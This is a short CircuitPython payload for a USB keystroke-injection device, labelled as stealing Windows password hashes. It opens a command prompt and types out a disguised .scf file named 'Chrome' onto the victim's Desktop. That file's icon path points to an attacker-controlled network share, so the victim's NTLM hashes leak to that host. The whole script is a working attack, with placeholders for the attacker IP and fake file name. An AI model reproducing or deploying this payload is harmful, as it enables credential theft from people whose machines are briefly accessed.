# Windows
# Steal Password Hashes using a .scf file placed on the target's Desktop
# The 2xdropout 2024
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS


def main():
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
    pauseTime = 0.4
    attackIP = "127.0.0.1"  #Change me
    fakeFileName = "Chrome"  #Change me
    iconPath = "\\share\\chrome.ico"  #Change me
    fileCreationCommand = 'copy con "%HOMEPATH%/DESKTOP/'+fakeFileName+'.scf"\n'
    iconFileLine = 'IconFile="\\\\'+attackIP+iconPath+'"'

    kbd.press(Keycode.GUI)
    kbd.release_all()
    time.sleep(pauseTime)
    layout.write('CMD\n')
    time.sleep(0.6)
    layout.write(fileCreationCommand)
    layout.write('[Shell]\n')
    layout.write(iconFileLine)
    layout.write("\n[Taskbar]\n")
    layout.write("Command=ToggleDesktop\n")
    time.sleep(pauseTime)
    kbd.press(Keycode.CONTROL, Keycode.C)
    kbd.release_all()
    layout.write('exit\n')

main()
